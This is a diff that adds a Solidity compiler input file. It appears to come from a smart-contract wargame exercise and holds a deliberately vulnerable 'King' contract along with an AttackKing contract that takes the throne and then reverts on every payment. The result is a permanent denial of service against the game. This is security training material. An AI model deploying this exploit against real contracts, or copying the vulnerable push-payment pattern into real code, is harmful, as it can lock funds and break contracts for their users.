@@ -1,0 +1,38 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/King/AttackKing.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract AttackKing {\n\n  address payable target;\n  \n  constructor(address payable _target) {\n    target = _target; \n  }\n\n  function makeMeKing() external payable {\n    (bool success, ) = target.call{value: msg.value}(\"\");\n    require(success, \"Fail on the run to the throne!!\");\n  }\n\n  receive() external payable {\n    revert(\"I'm the King!!\");\n  }\n}"
+    },
+    "contracts/King/King.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract King {\n\n  address king;\n  uint public prize;\n  address public owner;\n\n  constructor() payable {\n    owner = msg.sender;  \n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  receive() external payable {\n    require(msg.value >= prize || msg.sender == owner);\n    payable(king).transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  function _king() public view returns (address) {\n    return king;\n  }\n}"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
